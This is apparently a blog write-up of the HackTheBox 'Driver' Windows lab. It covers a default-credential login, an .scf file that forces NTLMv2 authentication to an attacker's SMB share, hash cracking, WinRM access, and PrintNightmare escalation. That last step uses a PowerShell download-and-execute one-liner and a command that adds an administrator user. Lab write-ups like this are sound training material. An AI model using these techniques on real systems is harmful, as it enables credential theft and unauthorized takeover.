---
title: Driver
date: 2026-03-10
categories: [CTFs, HackTheBox]
tags: [windows, scf-file, ntlm-theft, cracking, winrm, spoolsv, printnightmare, cve-2021-1675]
media_subpath: /assets/img/HackTheBox/Driver
image: 
    path: Driver.webp
    lqip: data:image/webp;base64,UklGRlQAAABXRUJQVlA4IEgAAABwAwCdASoUAAsAPzmEuVOvKKWisAgB4CcJZQAAQvISPkMyQkgA/ujxDyiW5/GX0W2l7iuawBRdfYQLA4xJXfnW/AuOPR71AAA=
    alt: Info Card
---

## Summary

[Driver](https://www.hackthebox.com/machines/driver){: target="_blank" } is an easy-difficulty Windows machine that explores weak credentials and printer-related vulnerabilities. We gain initial access by bypassing **basic HTTP authentication** with default credentials, then leverage a file upload feature to capture the user tony's NTLM hash using a malicious `.scf` file. After cracking the hash, we authenticate via WinRM. Final privilege escalation is achieved by exploiting a vulnerable printer driver to gain SYSTEM authority.

## Recon

### Open Ports

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.129.95.238 -oN allports
```

![Nmap Scan](allports.webp)
_Nmap Scan all TCP Ports_

### Service Detection

```bash
nmap -p80,135,445,5985 -sC -sV 10.129.95.238 -oN services
```

![Nmap Scan](services.webp)
_Nmap Scan Default Scripts & Versions_

### SMB Basic Enumeration

Just to know more information about the target, we will run `crackmapexec` to see the Windows version and `smbclient` to see if we can enumerate shares using a null session.

![SMB](smb.webp)
_Crackmapexec & SMBClient_

Since there is no useful info we will continue with other services.

## Shell as tony

In the `nmap` results we have a user disclosure, this can also be found by either looking at the technologies of the website or its headers:

![Headers](headers.webp)
_Technologies & Headers_

Using the browser we are shown a login panel in which we are going to test common passwords for the **admin** user that we found before.

![Login](login.webp)
_Testing default credentials_

**admin:admin** is valid for this service, so now we have to enumerate a litle bit more:

![Dashboard](welcome.webp)
_Logged in as admin_

This is the only resource of the web page that works and it allow us to upload a file. The interesting part is the text highlighted on the image below. It says the firmware will be uploaded to a file share and there is a testing team which reviews the uploads manually and tests them. We can start thinking about possible ways to abuse this review because if since there are using an SMB share, we could create a malicious **scf (Shell Command File)** file that loads an icon from our server. Since **Windows** requires authentication when looking for a resource, we will get the **NTLMv2** hash of the user performing the testing.

![Firmware Update](firmup.webp)
_Firmware Updates_

>SCF files are helpful to pentesters since they let you to provide the location to a **.ico** file from within the file. While loading an icon file by itself might not be all that helpful, the route used to load the file might link to a remote server via a **UNC path**, which means we could leverage SCF files to collect NTLMv2 hashes.
{: .prompt-info }

### Using SCF Files to Gather hashes

Here is a [blog](https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication#execution-via-.scf){: target="_blank" } that explains more about this technique. We are going to create the **file.scf** with the content shown below:

```
[shell]
Command=2
IconFile=\\{YOUR-IP}\share\test.ico
[Taskbar]
Command=ToggleDesktop
```
{: file="file.scf" }

![SCF File](file.webp)
_Shell Script File_

After creating our **scf** file, we have to start an **SMB server**. To achieve that we are going to use `impacket-smbserver` using the following command:

```bash
impacket-smbserver share $(pwd) -smb2support
```

![SMB Server](setsmb.webp)
_Impacket SMB Server_

Since our **SMB server** is up we just have to upload the **file.scf** that has the instructions to load an icon from our server. When the file is open it will go to our server asking for the resource and sending the user's hash in the request.

![SCF File Upload](upload.webp)
_SCF File Upload_

![Hash](hash.webp)
_Tony's NTLMv2 hash_

### Cracking NTLMv2 Hash

We get a hash for the user **tony**, so then we have to crack it. In this case we are going to use `john` and the syntax is here:

![Tony's Password](pass.webp)
_Tony's Password_

### Gaining Access

Remember that in the `nmap` results we found **SMB** and **WinRM** running on the target machine. So we can use `crackmapexec` to check if the password works for **winrm** so we can use the credential to access the target.

![Crackmapexec](cme.webp)
_Valid Winrm credential_

When you see that **Pwn3d!** text next to the service it means we can log in using that credentials. Since the service is **WinRM** we are going to use `evil-winrm` to get a `powershell` instance on the box:

![Evil-Winrm](winrm.webp)
_Evil WinRM_

## Privilege Escalation - CVE-2021-1675

One of possible ways to elevate your privileges on a Windows machine is to abuse the processes running on that target. In this specific box we can notice that **spoolsv** process is available. After a simple search we can found a vulnerability on this process.

![Processes](ps.webp)
_Running Processes_

The [CVE-2021-1675](https://www.helpnetsecurity.com/2021/06/30/poc-cve-2021-1675/){: target="_blank" } is a critical vulnerability found in **Windows Print Spooler** service which allows remote code execution. To exploit this vulnerability we are going to use this [GitHub Repository](https://github.com/calebstewart/CVE-2021-1675){: target="_blank" } that will create a user and add it to the **Administrators** group.

![Exploit](pwsh.webp)
_PrintNightmare Exploit_

After downloading the **ps1** script and setting our http server, we have to run this instruction in the target machine to access our http server and interpret the script.

```powershell
IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.14.20/CVE-2021-1675.ps1')
```

![HTTP Server](pyserver.webp)
_Python HTTP Server_

Here we can see that there is only one user, after interpret the script the instructions will be set and we can follow the instructions of the exploit. We have to call the `Invoke-Nightmare` function and create our user with its password. Here is the command you have to run:

```powershell
Invoke-Nightmare -DriverNamme "Xerox" -NewUser "flygerth" -NewPassword "pwned"
```

![Adding User](newuser.webp)
_Adding a new user_

As shown above, after running the instruction our user will be created and if we check the groups we can notice that we are part of the **Administrators**.

![Administrators Group](check.webp)
_Flygerth is an Administrator on the box_

Finally we can use `crackmapexec` one more time to check our credential and we can use `impacket-psexec` to gain access as `nt authority\system`

```bash
impacket-psexec flygerth@10.129.95.238
```

![Pwn3d](psexec.webp)
_Hi! I'm System_

## Flags

- [x] user.txt

```powershell
type C:\Users\tony\Desktop\user.txt
7d8**************************3d9
```

- [x] root.txt

```powershell
type C:\Users\Administrator\Desktop\root.txt
cba**************************7f2
``` 

<h2 style="text-align:center;">Hope this was helpful, see you in the next writeup! 👋   🛡️</h2>
{: data-toc-skip='' .mt-4 .mb-0 }
